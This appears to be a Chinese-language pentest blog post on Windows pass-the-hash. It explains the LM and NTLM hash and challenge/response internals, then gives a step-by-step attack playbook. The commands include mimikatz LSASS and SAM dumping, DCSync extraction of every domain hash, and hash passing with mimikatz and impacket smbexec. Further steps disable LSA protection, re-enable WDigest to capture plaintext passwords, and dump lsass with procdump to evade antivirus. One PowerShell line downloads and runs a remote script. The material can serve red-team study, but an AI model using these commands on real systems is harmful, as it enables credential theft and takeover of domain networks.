之前在做内网横线移动基础时，简单介绍了一下利用Pass the hash手法来实现横向移动，这里打算详细看看

## 基础知识

先来看看哈希传递·，传递的是什么hash

### LM Hash

LM(LAN Mannager) 协议使用的hash就叫做 LM Hash, 由IBM设计和提出, 在过去早期使用。

由于其存在比较多的缺点，比较容易破解。

**自WindowsVista和Windows Server 2008开始,Windows取消LM hash。**

#### LM hash的生成规则

- 用户的密码被限制为最多14个字符。
- 用户的密码转换为大写。
- 密码转换为16进制字符串，不足14字节将会用0来再后面补全。
- 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7bit为一组末尾加0，组成新的编码（str_to_key()函数处理）
- 上步骤得到的8byte二组，分别作为DES key为"KGS!@#$%"(转换为16进制字符串后)进行加密。
- 将二组DES加密后的编码拼接，得到最终LM HASH值。

#### LM Manager Challenge/Response

LM Manager Chanllenge/Response验证机制。

B向A发送一个8字节challenge,A会根据缓存的LM-Hash计算，并生成一个24字节的响应返回给B，B会根据自己缓存的LM Hash进行相同的计算，并与A的响应进行比较，匹配则验证通过。

+ 具体计算

  ```shell
  B->chanllenge : 0001020304050607 ->A
  
  #假设明文密码为123456 ->计算得LM Hash: 44efce164ab921caaad3b435b51404ee
  A响应B->将LM-Hash转变为21字节：44efce164ab921caaad3b435b51404ee0000000000->分为3组，七字节一组
  44efce164ab921 | caaad3b435b514 | 04ee0000000000
  
  ->将三组分别传递给str_to_key()进行处理,每组8字节->
  4476F2C26454E442 | CA54B47642ACD428 | 0476800000000000
  
  ->使用key对chanllenge分别进行标准的DES加密->
  DAF97F35EDB3D732 | DF9FC54405D829C6 | A61BFA0671EA5FC8
  
  ->最终得到一个24字节的响应
  DAF97F35EDB3D732DF9FC54405D829C6A61BFA0671EA5FC8
  
  ->A将响应发给B，B进行相同的运算
  ```

### NTLM Hash

为了解决LM加密和身份验证方案中固有的安全弱点，引入了NTLM协议。通常抓到的LM Hash为AAD3B435B51404EEAAD3B435B51404EE，都是没有价值的。

#### NTLM Hash的生成

password : 123456 

->将密码转化为ascii字符串 : 49 50 51 52 53 54

->ascii 转换为十六进制字符串 :31 32 33 34 35 36

->十六进制字符串转化为Unicode字符串 :310032003300340035003600

->对Unicode字符串使用MD4摘要算法 :32ed87bdb5fdc5e9cba88547376818d4

![hashcalc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/hashcalc.png)

#### NTLM认证过程

本地NTLM认证过程与LM认证过程类似，由三种消息组成:通常称为type 1(协商)，类型type 2(质询)和type 3(身份验证)。

客户端向服务端发送type1消息，包含客户端支持和服务七请求的功能

->服务器使用type2类型进行响应，包含生成的chanlenge

->客户端使用type3进行回复，其中包含通过challenge和缓存hash经过加密的response，respose代表着用户是否知晓密码

->服务器拿到type3后，同样使用challenge和hash进行加密得到response2，并于type3中的response进行比较。如果hash存储在与域控上，用户服务器就会通过netlogon联系域控建立一个安全通道,然后将type 1,type 2，type3 全部发给域控(这个过程也叫作Pass Through Authentication认证流程)

->域控加密得到response2,与response进行比较

**challenge信息能够从type2的流量中分析**

如下有一段质询消息

```
4e544c4d53535000020000000c000c003000000001028100
**0123456789abcdef**0000000000000000620062003c000000
44004f004d00410049004e0002000c0044004f004d004100
49004e0001000c0053004500520056004500520004001400
64006f006d00610069006e002e0063006f006d0003002200
7300650072007600650072002e0064006f006d0061006900
6e002e0063006f006d0000000000
```

用*包裹的部分即为challenge

#### NTLM响应计算

NTLM响应计算与LM响应计算是相同的，都是返回24字节的response，只有散列值的计算与LM不同

#### NTLMv2响应计算

NTLM版本2（“NTLMv2”）被用来解决NTLM中存在的安全问题。当启用NTLMv2时，NTLM响应被替换为NTLMv2响应，并且LM响应被替换为LMv2响应。

计算NTLM密码哈希，方法和上文一样

假设有如下

```
domain:HACK
username : TESTUSER
password : 123456
challenge : 0123456789abcdef
blob: 010000......
```

计算得到NTLM hash：32ed87bdb5fdc5e9cba88547376818d4 

->将用户名转化为大写:TESTUSER

->用户名和domain拼接在一起（domain or server name的值，区分大小写）：TESTUSERHACK

->计算拼接所得字符串的Unicode十六进制字符串：540045005300540055005300450052004800410043004b

->将NTLM hash作为HMAC MD5的消息认证算法的key(不区分大小写)，加密得到的unicode字符串生成NTLMv2散列：428c8c265137d26b0e3991a9d100eb6d

->连接质询消息中的challenge和blob:   0123456789abcdef010000......

->使用NTLMv2散列作为密钥，对连接的字符串做HMAC-MD5消息认证码算法，产生一个16字节的hash输出：5185e2269d787185b15a98e704acfd31

->产生的16字节输出与blob连接生成NTLMv2响应：5185e2269d787185b15a98e704acfd3101000......

## PTH攻击

+ 为什么能够执行哈希传递攻击,由于LM hash在2012R2之后默认禁用了，这里只说NTLM Hash的情况，在type3计算response的时候，客户端是使用用户的hash进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户hash。
+ 关于补丁kb2871997，能够缓解PTH，还能阻止mimikatz抓取明文密码，后面再来说，先来看最简单的情况

### mimikatz直接抓取hash进行传递

+ 抓取阶段

这种都是没有打补丁，mimikatz能够直接抓的情况，上传mimikatz执行命令抓取hash

```shell
#读取lsass的进程信息
privilege::debug
sekurlsa::msv
```

![sekurlsamsv](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/sekurlsamsv.png)

```shell
#获取全部用户的密钥和明文
privilege::debug
sekurlsa::logonPasswords full
```

![sekurlsalogon](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/sekurlsalogon.png)

```shell
#读取SAM数据库获取用户Hash,获取系统所有本地用户的hash
privilege::debug
token::elevate
lsadump::sam
```

![samlocal](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/samlocal.png)

```shell
#使用DCSync导出域内所有用户的hash
lsadump::dcsync /domain:hack.com /all /csv
```

![dcsyncdump](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dcsyncdump.png)

+ 传递阶段

  > mimikatz有自带的hash传递功能，执行以下命令使用已抓到的hash进行传递

  ```shell
  #通过域管用户的hash进行传递
  sekurlsa::pth /user:Administrator /domain:hack.com /ntlm:ecf2148441c0ef24bdeebc416c876490
  ```

  攻击后会开启一个命令行，在其中可以访问DC的CIFS服务

  > 通过其他支持pth的项目进行传递，例如psexec，通过psexec来pth能够直接登录目标主机

```shell
python smbexec.py -hashes  :c17336b6c2ea715e02e8bbd04c91e543 hack.com/Administrator@192.168.30.10
#python smbexec.py -hashes LM HASH:NTLM HASH <domain>/<username>@<IP>
```

通过impacket中的项目能够直接登录远程主机

+ 通过pth登录远程桌面

> win server2012 R2以上的版本采用新版RDP，在受限管理员模式下，可以直接使用hash登录远程桌面，不需要提供明文密码
>
> 执行以下命令开启受限管理员模式
>
> ```powershell
> reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
> ```
>

使用mimikatz进行传递攻击

```shell
privilege::debug sekurlsa::pth /user:Administrator /domain:hack.com /ntlm:ecf2148441c0ef24bdeebc416c876490 "/run:mstsc.exe /restrictedadmin"
```

### 无法直接抓取的情况

#### DEBUG权限被移除

mimikatz中抓取hash的方法，大部分都需要获得debug权限，一般管理员账户拥有debug权限，如果将debug权限被移除，则需要debug权限的工具均无法正常工作，如果上传的mimikatz无法获得debug权限，可以选用不需要debug权限就能进行hashdump的dcsync技术，因为该技术是通过像域控发起请求，并非是本地操作

```shell
#dump指定用户的信息，包括hash值
mimikatz.exe "lsadump::dcsync /domain:hack.com /user:hack\Administrator" exit
#导出域内所有用户的信息，包括hash值
mimikatz.exe "lsadump::dcsync /domain:hack.com /all" exit
mimikatz.exe "lsadump::dcsync /domain:hack.com /all /csv" exit
```

#### LSA保护

LSA 包含本地安全机构服务器服务 (LSASS) 进程，可以验证用户的本地和远程登录，并强制本地安全策略。 Windows 8.1 操作系统和更高版本为 LSA 提供其他保护，以防止未受保护的进程读取内存及注入代码。

当windows启用 LSA保护时，mimikatz无法读取lsass的内存

> 解决方法一：关闭LSA保护，该操作可以通过修改注册表完成
>
> ```shell
> #开启LSA保护的报错示例
> mimikatz # sekurlsa::msv
> ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
> 
> mimikatz # privilege::debug
> Privilege '20' OK
> mimikatz # sekurlsa::logonPasswords
> ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
> 
> #开启LSA保护策略
> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f 
> #关闭LSA保护策略
> reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
> ```
>
> 解决方法二：利用mimidrv.sys删除lsass.exe上的保护措施
>
> ```shell
> #将mimidrv.sys上传到同一目录下，启动mimikatz后进行加载
> mimikatz# !+
> mimikatz# !processprotect /process:lsass.exe /remove
> mimikatz# sekurlsa::logonpasswords
> ```
>

#### 禁止Wdigest Auth缓存明文密码

Microsoft发布了一个补丁[KB2871997](https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/)，安装此补丁后，允许用户在注册表中配置一个设置（高版本已默认配置）禁用 WDigest 身份验证，从而防止将明文密码存储在内存中。此时mimikatz用抓取时密码字段会显示为null

> 开启Wdigest Auth
>
> ```shell
> #cmd
> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
> #powershell
> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
> #meterpreter
> reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
> ```

> 关闭Wdigest Auth
>
> ```shell
> #cmd
> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
> #powerhsell
> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0
> #meterpreter
> reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0
> #mimikatz
> sekurlsa::wdigest
> ```

**绕过方法：手动开启Wdigest Auth，强制锁屏或注销，让管理用重新登录，把明文密码储存在内存中**

+ 强制锁屏/注销(一般都需要注销)

  ```shell
  #cmd
  rundll32 user32.dll,LockWorkStation
  #powershell
  powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1');"
  #cmd注销当前用户
  1.logoff
  2.shutdown.exe /l /f 		#静默注销，但是需要管理员权限
  ```

等待管理员用户重新登录，再进行常规的密码抓取，就能够抓到明文密码了

#### Mimikatz离线抓取

算是一些小方法，用来绕过杀软或是检查的

+ 通过procdump上去将lsass.exe进程dump下来抓取

  并且由于这个工具具有微软官方的签名，可以很好的绕过杀软

  ```shell
  procdump64.exe -accepteula -ma lsass.exe lsass.dmp
  #-ma写入完整的转储文件
  #-accepteula自动接受用户许可协议(静默)
  ```

+ 将保存的转储文件保存到mimikatz.exe同一目录下

  ```shell
  mimikatz.exe
  privilege::debug
  sekurlsa::minidump lsass.dmp
  sekurlsa::logonpasswords full
  ```

  成功离线抓取密码

  ![mimikatzdumpproc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/mimikatzdumpproc.png)

+ 离线读取SAM数据库

  通过导出sam和system注册表来达成目的

  ```shell
  #导出注册表
  reg save HKLM\SYSTEM SystemBkup.hiv
  reg save HKLM\SAM SamBkup.hiv
  ```
  
  复制文件
  
  ```shell
  C:\Windows\System32\config\SYSTEM
  C:\Windows\System32\config\SAM
  ```
  
  这些文件默认无法被复制，可以通过NinjaCopy等脚本进行导出，导出后可以在其他系统上进行加载，这里我将文件下载到主系统上进行导出，执行以下命令
  
  ```shell
  privilege::debug
  lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv
  ```
  
  ![dumphiv](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dumphiv.png)

关于SAM导出的原理分析：https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash

## 参考链接：

https://xz.aliyun.com/t/8601

https://msrc.microsoft.com/blog/2014/06/an-overview-of-kb2871997/

https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/

